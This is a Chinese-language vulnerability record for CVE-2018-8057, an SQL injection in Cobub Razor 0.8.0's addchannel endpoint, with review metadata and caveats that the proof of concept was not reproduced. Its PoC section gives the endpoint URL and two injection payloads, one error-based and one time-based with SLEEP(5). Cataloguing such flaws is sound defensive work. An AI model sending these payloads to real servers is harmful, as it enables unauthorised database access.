---
source: "Mr-xn/Penetration_Testing_POC"
title: "Cobub Razor addchannel SQL 注入"
product: "Cobub Razor"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-8057"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "0.8.0；MySQL"
prerequisites: "管理路由鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Cobub%20Razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-1ebef65c89036eb6102cf41b"
entity_id: "ve-1ebef65c89036eb6102cf41b"
schema_version: "1"
---

# Cobub Razor addchannel SQL 注入

## 条目说明

- 对象与具体问题：Cobub Razor；addchannel SQLi
- 版本、配置及部署条件：0.8.0；MySQL
- 认证与权限前提：管理路由鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 描述channel_name/platform双参数，PoC只证明channel_name候选，platform=1正常值
- 两个请求无结果、报错/延时无对照，可能新增渠道状态
- 保留issue162，缺修复版及认证条件

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

#### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.8.0存在SQL注入漏洞|2018-04-16|Kyhvedn（yinfengwuyueyi@163.com、kyhvedn@5ecurity.cn）|[http://www.cobub.com/](http://www.cobub.com/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) |0.8.0| [CVE-2018-8057](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8057)|  

##### 漏洞概述  

> Cobub Razor 0.8.0存在SQL注入漏洞，“/application/controllers/manage/channel.php”页面的“channel_name”及“platform”参数过滤不严格导致存在SQL注入漏洞。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/cobub/razor/issues/162)告知作者。   


#### POC实现代码如下：  

> http://localhost/index.php?/manage/channel/addchannel  

> POST data:  

>  1.channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1  

>  2.channel_name=test" AND SLEEP(5)-- NklJ&platform=1


---

> 来源：Mr-xn/Penetration_Testing_POC
